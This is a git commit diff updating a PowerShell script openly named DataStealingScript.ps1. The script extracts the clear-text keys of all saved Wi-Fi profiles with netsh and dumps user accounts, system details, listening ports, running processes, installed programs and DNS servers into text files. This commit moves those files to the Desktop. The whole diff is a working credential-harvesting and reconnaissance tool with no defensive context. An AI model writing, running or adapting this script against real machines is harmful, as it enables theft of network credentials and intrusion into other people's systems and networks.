5a1b6660b9f2e9f7a1f2ad45ade544bf7d29843b
WinReversCracker <mahdikostoev2002@gmail.com>
2026-01-16 19:49:29 +0300

    Update DataStealingScript.ps1

--- DataStealingScript.ps1
+++ DataStealingScript.ps1
@@ -1,24 +1,25 @@
+$desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop')
+
+
 $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
 foreach ($profile in $profiles) {
     $details = netsh wlan show profile name="$profile" key=clear
     $keyLine = $details | Select-String "Key Content"
     if ($keyLine) {
-        "$profile : $($keyLine -replace '.*:','')" | Out-File wifi-passwords.txt -Append
+        "$profile : $($keyLine -replace '.*:','')" | Out-File "$desktopPath\wifi-passwords.txt" -Append
     }
 }
 
-netsh wlan show networks mode=bssid | Out-File wifi-ssid.txt
+netsh wlan show networks mode=bssid | Out-File "$desktopPath\wifi-ssid.txt"
 
-net user | Out-File users.txt
+net user | Out-File "$desktopPath\users.txt"
 
-Get-ComputerInfo | Out-File system-info.txt
+Get-ComputerInfo | Out-File "$desktopPath\system-info.txt"
 
-netstat -an | Select-String "LISTENING" | Out-File open-ports.txt
+netstat -an | Select-String "LISTENING" | Out-File "$desktopPath\open-ports.txt"
 
-net user | Out-File users.txt
+tasklist | Out-File "$desktopPath\tasklist.txt"
 
-tasklist | Out-File tasklist.txt
+Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Out-File "$desktopPath\programs.txt"
 
-Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Out-File programs.txt
-
-ipconfig /all | Select-String "DNS Servers" -Context 0,1 | Out-File dns-info.txt
+ipconfig /all | Select-String "DNS Servers" -Context 0,1 | Out-File "$desktopPath\dns-info.txt"
